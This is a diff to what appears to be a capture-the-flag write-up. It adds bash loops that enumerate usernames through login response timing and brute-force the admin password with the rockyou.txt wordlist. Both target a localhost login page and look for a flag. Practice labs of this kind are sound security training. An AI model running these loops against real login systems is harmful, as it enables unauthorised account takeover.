@@ -36,4 +36,29 @@ curl -X POST -d "username=admin&password=123" http://localhost:3000/login -w "\n
 
 ```
 
- - Step 3: 
+- Step 3: Automate timing enumeration with rockyou.txt
+
+ ``` bash
+ while read user; do
+  echo -n "$user: "
+  curl -s -X POST -d "username=$user&password=123" http://localhost:3000/login -w "%{time_total}\n" -o /dev/null
+done < rockyou.txt
+
+ ```
+
+ - Step 4: Brute-force Password with Wordlist
+
+ ```bash
+ while read pass; do
+  echo -n "[*] Trying password: $pass ... "
+  resp=$(curl -s -X POST -d "username=admin&password=$pass" http://localhost:3000/login)
+  if echo "$resp" | grep -q "🎉 Flag"; then
+    echo "[+] Success! Password: $pass"
+    echo "$resp" | grep "FLAG"
+    break
+  else
+    echo "Invalid"
+  fi
+done < rockyou.txt
+
+ ```
